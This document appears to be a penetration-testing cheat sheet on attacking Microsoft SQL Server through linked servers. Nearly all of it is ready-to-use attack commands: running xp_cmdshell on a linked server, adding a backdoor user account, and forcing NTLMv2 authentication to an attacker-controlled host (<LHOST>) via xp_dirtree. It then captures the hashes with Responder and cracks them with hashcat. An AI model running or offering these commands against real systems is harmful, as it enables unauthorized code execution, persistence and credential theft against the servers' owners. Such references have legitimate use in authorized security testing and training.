# MSSQL Linked Server xp_cmdshell RCE

With any SQL login, check for linked servers — a common lateral-movement path even when `xp_cmdshell` is disabled locally.

```bash
mssqlclient.py '<domain>/<user>:<pass>'@<target> -windows-auth
```
```sql
EXEC sp_linkedservers;
EXEC ('xp_cmdshell ''whoami''') AT <LINKED_SERVER_NAME>;
EXEC ('xp_cmdshell ''net user <u> <p> /add''') AT <LINKED_SERVER_NAME>;
```

If `xp_cmdshell` is unavailable and the DB itself is unreachable, `xp_dirtree` still works for anyone who can run queries — it forces a UNC fetch, coercing an NTLMv2 auth to a listener you control, even cross-domain:
```sql
EXEC xp_dirtree '\\<LHOST>\share';
```
```bash
sudo responder -I <iface>   # or smbserver.py -smb2support <name> <dir>
hashcat -a0 -m5600 hash.txt <WORDLIST>
```
